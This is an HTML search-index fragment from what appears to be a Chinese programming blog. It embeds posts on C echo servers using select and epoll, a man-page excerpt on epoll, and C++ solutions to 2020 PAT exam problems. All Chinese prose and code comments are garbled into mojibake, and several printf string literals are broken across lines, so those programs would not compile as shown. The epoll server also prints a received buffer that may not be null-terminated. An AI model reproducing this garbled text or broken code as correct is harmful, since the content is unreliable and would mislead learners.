">linuxæœåŠ¡ç«¯--3. libeventå®ç°å›æ˜¾æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xdsvqq_xthbax/"" data-c="
          &lt;h2 id=&#34;ä»£ç &#34;&gt;ä»£ç &lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netdb.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;ctype.h&amp;gt;
#include &amp;lt;sys/epoll.h&amp;gt;

int main()
{
    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd == -1)
    {
        perror(&amp;quot;socket error&amp;quot;);
        exit(1);
    }

    //è®¾ç½®ç«¯å£å¤ç”¨
    int opt = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;amp;opt, sizeof(opt));

    struct sockaddr_in serv_addr;
    memset(&amp;amp;serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(9317);
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    int ret = bind(lfd, (struct sockaddr *)&amp;amp;serv_addr, sizeof(serv_addr));
    if (ret == -1)
    {
        perror(&amp;quot;bind error&amp;quot;);
        exit(1);
    }

    ret = listen(lfd, 64);
    if (ret == -1)
    {
        perror(&amp;quot;listen error&amp;quot;);
        exit(1);
    }

    struct sockaddr_in client_addr;
    socklen_t cli_addr_len = sizeof(struct sockaddr_in);

    //
    struct epoll_event events[2000];

    // åˆ›å»ºepollå®ä¾‹
    int epfd = epoll_create(2000);

    //æŠŠç›‘å¬äº‹ä»¶æŒ‚åˆ°epollçº¢é»‘æ ‘ä¸Š
    struct epoll_event event_l;
    event_l.events = EPOLLIN;
    event_l.data.fd = lfd;
    if ((epoll_ctl(epfd, EPOLL_CTL_ADD, lfd, &amp;amp;event_l)) &amp;lt; 0)
    {
        fprintf(stderr, &amp;quot;epoll ctl error: %s\n&amp;quot;, strerror(errno));
        exit(1);
    }

    while (1)
    {
        // æœ‰äº‹ä»¶å‘é€çš„epoll_eventç»“æ„ä½“ä¼šå¤åˆ¶åˆ°eventsä¸Šï¼Œretä¸ºäº‹ä»¶æ€»æ•°
        int ret = epoll_wait(epfd, events, sizeof(events) / sizeof(events[0]), -1);
        if (ret &amp;lt; 0)
        {
            fprintf(stderr, &amp;quot;epoll wait error: %s\n&amp;quot;, strerror(errno));
            exit(1);
        }

        int k;
        for (k = 0; k &amp;lt; ret; k++)
        {
            // è¯»äº‹ä»¶
            if (events[k].events &amp;amp; EPOLLIN)
            {
                // tfd: this fd
                int tfd = events[k].data.fd;

                if (tfd == lfd)
                {
                    // å¤„ç†ç›‘å¬å¥—æ¥å­—çš„äº‹ä»¶
                    int cfd = accept(lfd, (struct sockaddr *)&amp;amp;client_addr, &amp;amp;cli_addr_len);
                    if (cfd &amp;lt; 0)
                    {
                        fprintf(stderr, &amp;quot;accept error: %s\n&amp;quot;, strerror(errno));
                    }

                    // æŠŠå®¢æˆ·ç«¯fdæŒ‚åˆ°epollçº¢é»‘æ ‘ä¸Š
                    struct epoll_event tmp;
                    tmp.events = EPOLLIN;
                    tmp.data.fd = cfd;
                    if ((epoll_ctl(epfd, EPOLL_CTL_ADD, cfd, &amp;amp;tmp)) &amp;lt; 0)
                    {
                        fprintf(stderr, &amp;quot;epoll ctl error: %s\n&amp;quot;, strerror(errno));
                        exit(1);
                    }
                }
                else
                {
                    // å®¢æˆ·ç«¯fdçš„äº‹ä»¶
                    char buff[1024];
                    int rec_len, i;
                    if ((rec_len = recv(tfd, buff, sizeof(buff), 0)) &amp;lt; 0)
                    {
                        fprintf(stderr, &amp;quot;read error: %s\n&amp;quot;, strerror(errno));
                        exit(1);
                    }
                    else if (rec_len == 0)
                    {
                        // å®¢æˆ·ç«¯å…³é—­è¿æ¥
                        if ((epoll_ctl(epfd, EPOLL_CTL_DEL, tfd, NULL)) &amp;lt; 0)
                        {
                            fprintf(stderr, &amp;quot;epoll ctl error: %s\n&amp;quot;, strerror(errno));
                            exit(1);
                        }
                        close(tfd);
                    }
                    else
                    {
                        printf(&amp;quot;%s&amp;quot;, buff);
                        for (i = 0; i &amp;lt; rec_len; ++i)
                        {
                            buff[i] = toupper(buff[i]);
                        }
                        send(tfd, buff, rec_len, 0);
                    }
                }
            }
        }
    }
    close(epfd);
    close(lfd);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;epollçš„ä¸€ç‚¹å°é—®é¢˜&#34;&gt;epollçš„ä¸€ç‚¹å°é—®é¢˜&lt;/h2&gt;
&lt;p&gt;å¦‚æœæŸä¸ªfdè¢«å…³é—­ï¼Œå¹¶ä¸”è¿™æ¬¡å…³é—­æ˜¯çœŸæ­£åœ°é‡Šæ”¾äº†èµ„æºï¼Œè€Œä¸æ˜¯å‡å°‘å¼•ç”¨æŠ€æœ¯ï¼Œé‚£ä¹ˆè¿™ä¸ªfdä¼šè‡ªåŠ¨ä»eopllä¸­åˆ é™¤ï¼Œè¿™æ—¶å†è°ƒç”¨epoll_ctl(EPOLL_CTL_DEL)å¯èƒ½ä¼šæŠ¥é”™ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;   Q6  Will closing a file descriptor cause it  to  be  removed  from  all
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;       epoll sets automatically?

   A6  Yes,  but  be aware of the following point.  A file descriptor is a
       reference to an open file description (see  [open(2)](http://man.he.net/man2/open)).   Whenever  a
       descriptor  is duplicated via [dup(2)](http://man.he.net/man2/dup), [dup2(2)](http://man.he.net/man2/dup2), [fcntl(2)](http://man.he.net/man2/fcntl) F_DUPFD, or
       [fork(2)](http://man.he.net/man2/fork), a new file descriptor referring  to  the  same  open  file
       description  is  created.   An  open  file description continues to
       exist until all file descriptors referring to it have been  closed.
       A  file  descriptor is removed from an epoll set only after all the
       file descriptors referring to the underlying open file  description
       have been closed (or before if the descriptor is explicitly removed
       using [epoll_ctl(2)](http://man.he.net/man2/epoll_ctl) EPOLL_CTL_DEL).  This means that  even  after  a
       file  descriptor  that  is  part  of  an epoll set has been closed,
       events may be reported for  that  file  descriptor  if  other  file
       descriptors  referring  to  the  same  underlying  file description
       remain open.
&lt;/code&gt;&lt;/pre&gt;
">linuxæœåŠ¡ç«¯--2. epoll å®ç°å›æ˜¾æœåŠ¡å™¨</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xdsvqq_ymoehs/"" data-c="
          &lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netdb.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;ctype.h&amp;gt;
#include &amp;lt;sys/select.h&amp;gt;

int main()
{
    // åˆ›å»ºç›‘å¬å¥—æ¥å­—
    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd == -1)
    {
        perror(&amp;quot;socket error&amp;quot;);
        exit(1);
    }

    // è®¾ç½®ç«¯å£å¤ç”¨
    int opt = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;amp;opt, sizeof(opt));

    //IPåœ°å€ä¸ç«¯å£å·ä¿¡æ¯
    struct sockaddr_in serv_addr;
    memset(&amp;amp;serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(9317);
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    // ç»‘å®šã€ç›‘å¬
    int ret = bind(lfd, (struct sockaddr *)&amp;amp;serv_addr, sizeof(serv_addr));
    if (ret == -1)
    {
        perror(&amp;quot;bind error&amp;quot;);
        exit(1);
    }

    ret = listen(lfd, 64);
    if (ret == -1)
    {
        perror(&amp;quot;listen error&amp;quot;);
        exit(1);
    }

    // ç”¨æ¥æ¥æ”¶å®¢æˆ·ç«¯ipä¿¡æ¯
    struct sockaddr_in client_addr;
    socklen_t cli_addr_len = sizeof(struct sockaddr_in);

    // selectç”¨çš„ä¸¤ä¸ªäº‹ä»¶æ•°ç»„
    fd_set reads, temps;
    // æœ€å¤§çš„äº‹ä»¶fd
    int max_fd;
    // åˆå§‹åŒ–readsäº‹ä»¶è¡¨
    FD_ZERO(&amp;amp;reads);
    // è®¾ç½®å†…æ ¸ç›‘è§†ç›‘å¬å¥—æ¥å­—
    FD_SET(lfd, &amp;amp;reads);
    max_fd = lfd;

    while (1)
    {
        // å¤åˆ¶readsè¡¨ä¼ å‚ï¼Œä¿ç•™åŸreadsè¡¨ä¸å˜ï¼Œå› ä¸ºselectä¼šä¿®æ”¹ä¼ è¿›å»çš„è¡¨
        temps = reads;

        int ret = select(max_fd + 1, &amp;amp;temps, NULL, NULL, NULL);
        if (ret &amp;lt; 0)
        {
            fprintf(stderr, &amp;quot;select error: %s\n&amp;quot;, strerror(errno));
            exit(1);
        }

        // ç›‘å¬å¥—æ¥å­—æœ‰äº‹ä»¶
        if (FD_ISSET(lfd, &amp;amp;temps))
        {
            int cfd;
            if ((cfd = accept(lfd, (struct sockaddr *)&amp;amp;client_addr, &amp;amp;cli_addr_len)) &amp;lt; 0)
            {
                fprintf(stderr, &amp;quot;accept error: %s\n&amp;quot;, strerror(errno));
                exit(1);
            }
            // æ–°å¥—æ¥å­—ï¼ˆå®¢æˆ·å¥—æ¥å­—ï¼‰åŠ å…¥readsè¡¨
            FD_SET(cfd, &amp;amp;reads);
            max_fd = max_fd &amp;gt; cfd ? max_fd : cfd;
        }
        int k;
        for (k = lfd + 1; k &amp;lt;= max_fd; k++)
        {
            // å®¢æˆ·ç«¯æœ‰äº‹ä»¶ï¼Œå¤„ç†
            if (FD_ISSET(k, &amp;amp;temps))
            {
                char buff[1024];
                int rec_len, i;
                if ((rec_len = recv(k, buff, sizeof(buff), 0)) &amp;lt; 0)
                {
                    fprintf(stderr, &amp;quot;read error: %s\n&amp;quot;, strerror(errno));
                    exit(1);
                }
                else if (rec_len == 0)
                {
                    // å®¢æˆ·ç«¯å…³é—­è¿æ¥
                    close(k);
                    FD_CLR(k, &amp;amp;reads);
                }
                else
                {
                    for (i = 0; i &amp;lt; rec_len; ++i)
                    {
                        buff[i] = toupper(buff[i]);
                    }
                    send(k, buff, rec_len, 0);
                }
            }
        }
    }
    close(lfd);
    return 0;
}

&lt;/code&gt;&lt;/pre&gt;
">linuxæœåŠ¡ç«¯--1. selectå®ç°å›æ˜¾æœåŠ¡å™¨</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/sw67dr_kb5gab/"" data-c="
          &lt;h3 id=&#34;7-1-panda-and-pp-milk-20åˆ†&#34;&gt;7-1 Panda and PP Milk (20åˆ†)&lt;/h3&gt;
&lt;p&gt;è¿™é“é¢˜æ€æ­»äº†ä¸å°‘åŒå­¦çš„å¿ƒæ€ï¼Œä½†æ˜¯å¦‚æœæƒ³åˆ°æ–¹æ³•äº†å°±ç‰¹åˆ«ç®€å•ã€‚&lt;br&gt;
ç®€å•è¯´ä¸‹åšæ³•ï¼Œä¸€å…±å¯¹å…¨è¡¨è¿›è¡Œä¸¤æ¬¡æ‰«æï¼Œç¬¬ä¸€æ¬¡ä»å·¦åˆ°å³ï¼Œç¬¬äºŒæ¬¡ä»å³åˆ°å·¦ï¼Œæ¯æ¬¡æ‰«ææ—¶ï¼Œå¦‚æœåé¢ç†ŠçŒ«æ¯”å‰é¢é‡ï¼Œåˆ™ä¾›å¥¶é‡+1ï¼ˆä»¥2ã€3ã€4è®¡ï¼Œæœ€åç»Ÿä¸€ä¹˜100)å¦‚æœä½“é‡æŒå¹³ï¼Œåˆ™ä¿æŒä¸å˜ï¼Œä½“é‡å‡è½»ï¼Œåˆ™ä¾›å¥¶é‡æ¢å¤ä¸º2ï¼Œä»å·¦å‘å³æ‰«ææ»¡è¶³æ‰€æœ‰ç†ŠçŒ«çœ‹åˆ°è‡ªå·±å·¦è¾¹çš„ç†ŠçŒ«éƒ½ä¼šæ»¡æ„ï¼Œä»å³å‘å·¦æ»¡è¶³å³è¾¹ç†ŠçŒ«ï¼Œå¯¹æ¯ä¸ªç†ŠçŒ«å–ä¸¤æ¬¡æ‰«æä¸­çš„è¾ƒå¤§å€¼ï¼Œå³ä¸ºç­”æ¡ˆã€‚&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ä½“é‡&lt;/th&gt;
&lt;th&gt;180&lt;/th&gt;
&lt;th&gt;160&lt;/th&gt;
&lt;th&gt;100&lt;/th&gt;
&lt;th&gt;150&lt;/th&gt;
&lt;th&gt;145&lt;/th&gt;
&lt;th&gt;142&lt;/th&gt;
&lt;th&gt;138&lt;/th&gt;
&lt;th&gt;138&lt;/th&gt;
&lt;th&gt;140&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;å·¦å‘å³&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å³å‘å·¦&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;æœ€ç»ˆä¾›å¥¶é‡&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;

using namespace std;

const int NMAX = 10005;
const int WMAX = 205;

int main() {
    int n, wight[NMAX], milk_l[NMAX], milk_r[NMAX];
    cin &amp;gt;&amp;gt; n;
    for (int i = 0; i &amp;lt; n; i++) {
        cin &amp;gt;&amp;gt; wight[i];
    }
    int pre, now_milk;
    now_milk = 2;
    pre = WMAX;
    for (int i = 0; i &amp;lt; n; i++) {
        // å·¦å‘å³æ‰«
        if (wight[i] &amp;gt; pre) {
            now_milk++;
        } else if (wight[i] == pre) { ; //ä½“é‡ç›¸ç­‰ä¾›å¥¶é‡ä¿æŒä¸å˜
        } else {
            now_milk = 2;
        }
        milk_l[i] = now_milk;
        pre = wight[i];
    }

    now_milk = 2;
    pre = WMAX;
    for (int i = n - 1; i &amp;gt;= 0; i--) {
        // å³å‘å·¦æ‰«
        if (wight[i] &amp;gt; pre) {
            now_milk++;
        } else if (wight[i] == pre) { ;
        } else {
            now_milk = 2;
        }
        milk_r[i] = now_milk;
        pre = wight[i];
    }
    int sum = 0;
    for (int i = 0; i &amp;lt; n; i++) {
        sum += max(milk_l[i], milk_r[i]); // å–è¾ƒå¤§è€…
    }
    cout &amp;lt;&amp;lt; sum * 100;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è‡³äºè¿™é¢˜æ˜¯æ€ä¹ˆæƒ³åˆ°çš„ï¼Ÿæˆ‘ä¹Ÿä¸çŸ¥é“ã€‚å¯èƒ½æ˜¯è€ƒåœºä¸Šçš„çµå…‰ä¸€ç°å§ï¼Œè¦æ˜¯æ¢ä¸ªæ—¶é—´å†æ¥ä¸€æ¬¡ï¼Œæˆ‘å¯èƒ½ä¹Ÿæƒ³ä¸åˆ°è¿™æ ·åšäº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;7-2-how-many-ways-to-buy-a-piece-of-land-25åˆ†&#34;&gt;7-2 How Many Ways to Buy a Piece of Land (25åˆ†)&lt;/h3&gt;
&lt;p&gt;æ¯”è¾ƒç®€å•&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;

using namespace std;

const int NMAX = 10005;

int main() {
    int n, m;
    int pieces[NMAX];
    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
    for (int i = 0; i &amp;lt; n; i++) {
        cin &amp;gt;&amp;gt; pieces[i];
    }
    int ans = 0;
    int i = 0, j = 0;
    int total = 0;
    while (i &amp;lt; n) {
        while (j &amp;lt; n &amp;amp;&amp;amp; total + pieces[j] &amp;lt;= m) {
            total += pieces[j++];
        }
        ans += j - i;
        total -= pieces[i++];
    }
    cout &amp;lt;&amp;lt; ans;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7-3-left-view-of-binary-tree-25åˆ†&#34;&gt;7-3 Left-View of Binary Tree (25åˆ†)&lt;/h3&gt;
&lt;p&gt;å…ˆå»ºæ ‘ï¼Œå†å±‚åºéå†ï¼Œè€ƒåŸºæœ¬åŠŸäº†&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;

using namespace std;

const int NMAX = 25;

struct TNode {
    int val;
    int level;
    TNode *left;
    TNode *right;
};

int pre[NMAX], in[NMAX];

TNode *new_node(int val) {
    TNode *node = new TNode;
    node-&amp;gt;val = val;
    node-&amp;gt;level = -1;
    node-&amp;gt;left = node-&amp;gt;right = nullptr;
    return node;
}

TNode *built_tree(int in_s, int in_e, int pre_s, int pre_e) {
    if (in_s &amp;gt; in_e)
        return nullptr;
    int mid;
    for (mid = in_s; mid &amp;lt;= in_e; mid++) {
        if (in[mid] == pre[pre_s])
            break;
    }

    TNode *node = new_node(pre[pre_s]);
    node-&amp;gt;left = built_tree(in_s, mid - 1, pre_s + 1, pre_s + mid - in_s);
    node-&amp;gt;right = built_tree(mid + 1, in_e, pre_s + mid - in_s + 1, pre_e);
    return node;
}


vector&amp;lt;int&amp;gt; ans;

void level_travel(TNode *node) {
    queue&amp;lt;TNode *&amp;gt; q;
    int now_level = 0;
    node-&amp;gt;level = 1;
    q.push(node);
    while (!q.empty()) {
        node = q.front();
        q.pop();
        if (node-&amp;gt;level != now_level) {
            ans.push_back(node-&amp;gt;val);
            now_level = node-&amp;gt;level;
        }

        if (node-&amp;gt;left) {
            node-&amp;gt;left-&amp;gt;level = node-&amp;gt;level + 1;
            q.push(node-&amp;gt;left);
        }
        if (node-&amp;gt;right) {
            node-&amp;gt;right-&amp;gt;level = node-&amp;gt;level + 1;
            q.push(node-&amp;gt;right);
        }
    }
}

int main() {
    int n;
    cin &amp;gt;&amp;gt; n;
    for (int i = 0; i &amp;lt; n; i++) {
        cin &amp;gt;&amp;gt; in[i];
    }
    for (int i = 0; i &amp;lt; n; i++) {
        cin &amp;gt;&amp;gt; pre[i];
    }
    TNode *root = built_tree(0, n - 1, 0, n - 1);

    level_travel(root);
    int l = ans.size();
    if (l &amp;gt; 0) {
        cout &amp;lt;&amp;lt; ans[0];
    }
    for (int i = 1; i &amp;lt; l; i++) {
        cout &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; ans[i];
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7-4-professional-ability-test-30åˆ†&#34;&gt;7-4 Professional Ability Test (30åˆ†)&lt;/h3&gt;
&lt;p&gt;å…ˆåˆ¤æ–­æ˜¯å¦æœ‰ç¯ï¼ˆæ¨èæ‹“æ‰‘æ’åºï¼ŒDFSä¹Ÿè®¸ï¼‰ï¼Œç„¶ådjsç®—æ³•ï¼Œçº¯è€ƒåŸºæœ¬åŠŸï¼Œä»£ç é‡æœ‰ç‚¹å¤§&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;

using namespace std;

const int NMAX = 1005;
const int MAX_DIS = 500;

struct Edge {
    int v;
    int score, daijinquan;

    Edge() {};

    Edge(int _v, int _score, int _daijinquan) {
        v = _v;
        score = _score;
        daijinquan = _daijinquan;
    }
};

vector&amp;lt;Edge&amp;gt; graph[NMAX];
int in[NMAX], in_buff[NMAX];
int n, m;

void not_consist() {
    // æœ‰ç¯ï¼Œç›´æ¥åˆ¤æ–­
    cout &amp;lt;&amp;lt; &amp;quot;Impossible.&amp;quot; &amp;lt;&amp;lt; endl;
    int k;
    cin &amp;gt;&amp;gt; k;
    while (k--) {
        int node;
        cin &amp;gt;&amp;gt; node;
        if (in[node] == 0)
            printf(&amp;quot;You may take test %d directly.
&amp;quot;, node);
        else
            printf(&amp;quot;Error.
&amp;quot;);
    }
}

//vector&amp;lt;int&amp;gt; pre[NMAX];
int pre[NMAX];

void Dijkstra() {
    bool visited[NMAX];
    int dis_score[NMAX];
    int dis_daijinquan[NMAX];
    fill(visited, visited + NMAX, false);
    fill(dis_score, dis_score + NMAX, MAX_DIS);
    fill(dis_daijinquan, dis_daijinquan + NMAX, 0);
    //dis_score[n]=0;
    //int node;
    for (Edge e:graph[n]) {
        dis_score[e.v] = dis_daijinquan[e.v] = 0;
        pre[e.v] = n;
    }
    while (true) {
        int min_node = n;
        int min_dis = MAX_DIS;
        for (int i = 0; i &amp;lt; n; i++) {
            if (visited[i])
                continue;

            if (dis_score[i] &amp;lt; min_dis) {
                min_dis = dis_score[i];
                min_node = i;
            } else if (dis_score[i] == min_dis) {
                if (dis_daijinquan[i] &amp;gt; dis_daijinquan[min_node])
                    min_node = i;
            }
        }
        if (min_node == n)
            break;
        visited[min_node] = true;
        for (Edge e:graph[min_node]) {
            if (min_dis + e.score &amp;lt; dis_score[e.v]) {
                pre[e.v] = min_node;
                dis_score[e.v] = min_dis + e.score;
                dis_daijinquan[e.v] = dis_daijinquan[min_node] + e.daijinquan;
            } else if (min_dis + e.score == dis_score[e.v]) {
                if (dis_daijinquan[min_node] + e.daijinquan &amp;gt; dis_daijinquan[e.v]) {
                    pre[e.v] = min_node;
                    dis_daijinquan[e.v] = dis_daijinquan[min_node] + e.daijinquan;
                }
            }
        }
    }
}

void consist() {
    // æ— ç¯ Djsç®—æ³•
    cout &amp;lt;&amp;lt; &amp;quot;Okay.&amp;quot; &amp;lt;&amp;lt; endl;
    Dijkstra();
    int k;
    cin &amp;gt;&amp;gt; k;
    for (int i = 0; i &amp;lt; k; i++) {
        int dst;
        cin &amp;gt;&amp;gt; dst;

        if (pre[dst] == n) {
            printf(&amp;quot;You may take test %d directly.
&amp;quot;, dst);
        } else {
            vector&amp;lt;int&amp;gt; path;
            while (dst != n) {
                path.push_back(dst);
                dst = pre[dst];
            }
            int l = path.size();
            printf(&amp;quot;%d&amp;quot;, path[l - 1]);
            for (int j = l - 2; j &amp;gt;= 0; j--) {
                printf(&amp;quot;-&amp;gt;%d&amp;quot;, path[j]);
            }
            printf(&amp;quot;
&amp;quot;);
        }
    }
}

bool check() {
    // åˆ¤æ–­æ˜¯å¦æœ‰ç¯
    bool visited[NMAX];
    fill(visited, visited + NMAX, false);
    for (int i = 0; i &amp;lt; n; i++) {
        int node = 0;
        for (; node &amp;lt; n; node++) {
            if (!visited[node] &amp;amp;&amp;amp; in[node] == 0) {
                break;
            }
        }
        if (node == n)
            break;
        visited[node] = true;
        for (Edge t:graph[node]) {
            in[t.v]--;
        }
    }
    for (int i = 0; i &amp;lt; n; i++) {
        if (in[i])
            return false;
    }
    return true;
}

int main() {

    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
    for (int i = 0; i &amp;lt; m; i++) {
        int u, v, s, d;
        cin &amp;gt;&amp;gt; u &amp;gt;&amp;gt; v &amp;gt;&amp;gt; s &amp;gt;&amp;gt; d;
        in[v]++;
        in_buff[v]++;// å…¥è¯»ä¿å­˜ä¸¤ä»½ï¼Œä¸€ä»½ç”¨æ¥åˆ¤ç¯ï¼Œä¸€ä»½åˆ¤æ–­æ˜¯å¦æ˜¯å¯ç¤ºèŠ‚ç‚¹ï¼ˆä¸€å¼€å§‹å…¥è¯»å°±æ˜¯0çš„èŠ‚ç‚¹ï¼‰
        graph[u].push_back(Edge(v, s, d));
    }

    for (int i = 0; i &amp;lt; n; i++) {
        if (in[i] == 0) {
            // ç”¨èŠ‚ç‚¹nä½œä¸ºæ€»èµ·å§‹èŠ‚ç‚¹ï¼Œè¿æ¥æ‰€æœ‰èµ·å§‹å…¥åº¦ä¸ºé›¶çš„èŠ‚ç‚¹ï¼Œå°†å›¾å˜æˆå•æºçš„
            graph[n].push_back(Edge(i, 0, 0));
        }
    }
    if (check())
        consist();
    else
        not_consist();
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">PAT 2020å¹´ç§‹è€ƒè§£ç­”</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/sw67dr_iy8tyk/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://pintia.cn/problem-sets/994805342720868352/problems/994805472333250560&#34;&gt;é¢˜ç›®é“¾æ¥&lt;/a&gt;&lt;br&gt;
é¢˜ç›®ä¸éš¾è¯»æ‡‚ï¼Œå¹¶ä¸”ä¸æ¶‰åŠä»€ä¹ˆç®—æ³•ï¼Œä½†æ˜¯é€»è¾‘ä¸Šéå¸¸ç¹çï¼Œç®—æ³•ç¬”è®°ä¸Šæœ‰éå¸¸è¯¦ç»†çš„é¢˜æ„è§£é‡Šï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œä¸»è¦æ˜¯å†™æˆ‘ç”¨çš„ä¸€ç§æ¨¡æ‹Ÿæ—¶é—´æ»´ç­”çš„æ–¹æ³•ï¼Œé€»è¾‘ä¸Šå¯èƒ½è¦ç®€å•ä¸€äº›ã€‚&lt;br&gt;
ä¸»è¦å°±æ˜¯å°†é¢˜ç›®ä¸­çš„æ—¶é—´ &lt;code&gt;08:00:00&lt;/code&gt;Â - &lt;code&gt;21:00:00&lt;/code&gt; ä»¥æ¯ç§’ä¸€ä¸ªé—´éš”ï¼Œæ€»å…± &lt;code&gt;13*60*60=46800&lt;/code&gt; ä¸ªæ—¶é’Ÿæ»´ç­”ï¼Œåœ¨æ¯ä¸€ä¸ªå§‹ç»ˆæ»´ç­”åˆ°æ¥çš„æ—¶å€™ï¼Œä¾æ¬¡å¤„ç†ç©å®¶åˆ°è¾¾äº‹ä»¶ã€æ¡Œå­ä½¿ç”¨è®¡æ—¶å‡1äº‹ä»¶ã€ç©ºæ¡Œå­å®‰æ’ç©å®¶ä½¿ç”¨äº‹ä»¶ã€‚&lt;br&gt;
è¿™æ ·æ€è€ƒæ€»ä½“ä¸Šé€»è¾‘ç®€æ´ä¸€äº›ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å…·ä½“çš„çœ‹ä»£ç &lt;/strong&gt; ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
#define MAXPEOPLE 10005
#define MAXTABLE 105
#define TIME2SECOND(h,m,s) ((((h) - 8) * 3600) + ((m) * 60) + (s))
#define MINUTE2SECOND(m) ((m) * 60)
#define MAXTIMESTAMP 46800


int second2minute(int s)
{
	//ç§’æ•°è½¬åˆ†é’Ÿï¼Œå¹¶ä¸”èˆå…¥
	int m = s / 60;
	if ((s % 60) &amp;gt;= 30)
		m++;
	return m;
}

void printTime(int second)
{
	//æ ¹æ®ç§’æ•°æ‰“å°æ—¶é—´
	int h, m, s;
	h = second / 3600 + 8;
	second = second % 3600;
	m = second / 60;
	second = second % 60;
	s = second;
	printf(&amp;quot;%02d:%02d:%02d &amp;quot;, h, m, s);
}

struct People
{
	int arrTime = 0;	//åˆ°è¾¾æ—¶é—´
	int needTime = 0;	//éœ€è¦çš„æ—¶é—´
	int serverTime = -1;	//æœåŠ¡å¼€å§‹æ—¶é—´
	bool VIP = false;		//æ˜¯å¦æ˜¯VIP
	bool servered = false;	//æ˜¯å¦å·²è¢«æœåŠ¡
};

